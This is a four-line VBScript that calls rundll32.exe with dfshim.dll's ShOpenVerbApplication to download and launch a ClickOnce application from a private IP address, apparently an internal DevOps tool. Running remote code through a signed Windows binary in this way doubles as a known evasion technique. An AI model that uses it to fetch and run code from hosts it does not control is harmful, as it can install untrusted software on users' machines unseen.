Set objShell = WScript.CreateObject("WScript.Shell" )
u = "http://192.168.0.123/devops/Devops_App.application"
objShell.Run("""C:\Windows\System32\rundll32.exe"" ""C:\Windows\System32\dfshim.dll"",ShOpenVerbApplication " & u)
Set objShell = Nothing
